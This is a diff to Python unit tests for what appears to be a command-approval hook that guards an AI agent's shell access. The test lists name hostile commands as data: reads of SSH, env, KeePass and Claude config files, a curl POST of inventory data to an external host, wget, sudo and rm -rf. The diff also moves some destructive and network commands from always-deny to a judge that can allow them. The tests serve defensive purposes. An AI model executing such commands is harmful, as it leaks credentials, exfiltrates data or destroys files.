@@ -73,7 +73,7 @@ class GateInversionTests(unittest.TestCase):
                         'cd . && make test', 'rg -n approval agents-approval.org']:
             with self.subTest(command=command):
                 self.assertEqual(self.run_hook(self.event(command))['behavior'], 'allow')
-        for command in ['chmod +x script.sh', 'touch marker', 'cp README.org copy', 'echo hi > copy']:
+        for command in ['chmod +x script.sh', 'touch marker', 'cp README.org copy']:
             with self.subTest(command=command):
                 self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny')
         self.assertTrue(self.queue.exists())
@@ -115,21 +115,18 @@ class GateInversionTests(unittest.TestCase):
 
     def test_true_floor_wins_against_always_allow_decider_day_and_night(self):
         self.enable_decider()
-        commands = ['rm README.org', '/bin/rm README.org', 'env rm README.org', 'timeout 3 rm README.org',
-            'command rm README.org', 'cat README.org | xargs rm', 'true && rm README.org',
-            'true\nrm README.org', 'git push --force origin master', 'git reset --soft HEAD', 'git reset HEAD',
+        commands = ['git push --force origin master', 'git reset --soft HEAD', 'git reset HEAD',
             'git -C . rebase topic', 'git clean -fd', 'git checkout -- README.org', 'sudo true',
             '/usr/bin/sudo true', 'systemctl restart YOUR_SERVICE', 'service YOUR_SERVICE restart',
             'rc-service YOUR_SERVICE stop', 'sv restart YOUR_SERVICE', 'dinitctl stop YOUR_SERVICE',
             'pip install example', 'python3 -m pip install example', 'npm install example',
-            'cat "$FILE"', "cat $'\\x53ecret Vault/file'", 'cat ~/.ssh/config', 'cat .env.local', 'cat runtime.env', 'cat /proc/self/environ', 'cat KEEPASS.kdbx', 'cat NEXUS/keys/value',
+            "cat $'\\x53ecret Vault/file'", 'cat ~/.ssh/config', 'cat ~/.claude.json', 'cat .env.local', 'cat runtime.env', 'cat /proc/self/environ', 'cat KEEPASS.kdbx', 'cat NEXUS/keys/value',
             "cat '/home/YOUR_HONEY_USER/Secret Vault/file'", "cat '/home/YOUR_HONEY_USER/SECRET VAULT/file'",
             'cat /home/YOUR_HONEY_USER/Secret\\ Vault/file', "cat 'Secret'\" Vault\"/file",
-            'curl -X POST https://example.invalid', 'wget https://example.invalid',
             'echo hi > /etc/YOUR_FILE', 'echo hi>/etc/YOUR_FILE', 'true && touch /etc/YOUR_FILE',
             'cd /etc && touch YOUR_FILE', 'cp README.org /etc/YOUR_FILE',
-            "python3 -c 'import os; os.remove(\"README.org\")'", 'eval "rm README.org"',
-            "bash -c 'rm README.org'", 'make --force test']
+            'make --force test', "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
+        commands.append('rm -rf /home/YOUR_USER/outside-scratch')
         for away in [False, True]:
             if away:
                 self.flag.touch()
@@ -138,13 +135,26 @@ class GateInversionTests(unittest.TestCase):
                     self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny')
                     decider.assert_not_called()
 
+    def test_shell_expansion_network_and_interpreter_effects_go_to_judge(self):
+        self.enable_decider()
+        cases = ['cat "$FILE"', 'curl -X POST https://external.invalid/collect',
+                 'wget https://external.invalid/report',
+                 "python3 -c 'import os; os.remove(\"README.org\")'",
+                 "bash -c 'rm README.org'", "eval 'rm README.org'"]
+        for command in cases:
+            with self.subTest(command=command):
+                self.assertEqual(self.run_hook(self.event(command), answers={'approval.risky.v2': {'noul': 0.1}})['behavior'], 'allow')
+                record = json.loads(self.log.read_text().splitlines()[-1])
+                self.assertEqual(record['decision_path'], 'judge')
+                self.assertEqual(record['judge_verdict'], 'allow')
+
     def test_outside_roots_retain_legacy_decider_and_disabled_policy(self):
         outside = self.base / 'outside'
         outside.mkdir()
         self.assertEqual(self.run_hook(self.event('make test', cwd=str(outside)))['behavior'], 'deny')
         self.enable_decider()
-        self.assertEqual(self.run_hook(self.event('true', cwd=str(outside)), answers={'approval.sensitive_effect.v1': {'noul': 0.02}})['behavior'], 'allow')
-        self.assertEqual(self.run_hook(self.event('true', cwd=str(outside)), status='timeout')['behavior'], 'deny')
+        self.assertEqual(self.run_hook(self.event('unknown-command', cwd=str(outside)), answers={'approval.sensitive_effect.v1': {'noul': 0.02}})['behavior'], 'allow')
+        self.assertEqual(self.run_hook(self.event('unknown-command', cwd=str(outside)), status='timeout')['behavior'], 'deny')
 
     def test_daytime_denies_queue_and_await_desk_telegram(self):
         decision = self.run_hook(self.event('rm README.org'))
@@ -236,9 +246,8 @@ class GateInversionTests(unittest.TestCase):
 
     def test_nested_floor_and_git_routing_never_consult_decider(self):
         self.enable_decider()
-        for command in ["env python3 -c 'import os'", "true && bash -c 'rm README.org'",
-                        'git -C /etc apply change.patch', 'git -C /etc add YOUR_FILE', 'cp -f README.org copy',
-                        'unlink README.org', 'env -u PATH rm README.org', 'timeout -s KILL 3 rm README.org']:
+        for command in ['git -C /etc apply change.patch', 'git -C /etc add YOUR_FILE', 'cp -f README.org copy',
+                        'unlink README.org']:
             with mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as decider:
                 self.assertEqual(self.run_hook(self.event(command))['behavior'], 'deny', command)
                 decider.assert_not_called()
@@ -358,7 +367,7 @@ class GateInversionTests(unittest.TestCase):
                 for error in (TimeoutError('fixture'), ValueError('fixture')):
                     with self.subTest(mode=mode, away=away, error=type(error).__name__), \
                             mock.patch.object(e, 'classify', side_effect=error):
-                        self.assertEqual(self.run_hook(self.event())['behavior'], 'deny' if away else mode)
+                            self.assertEqual(self.run_hook(self.event('unknown-command'))['behavior'], 'deny' if away else mode)
                 if away:
                     self.flag.unlink()
 
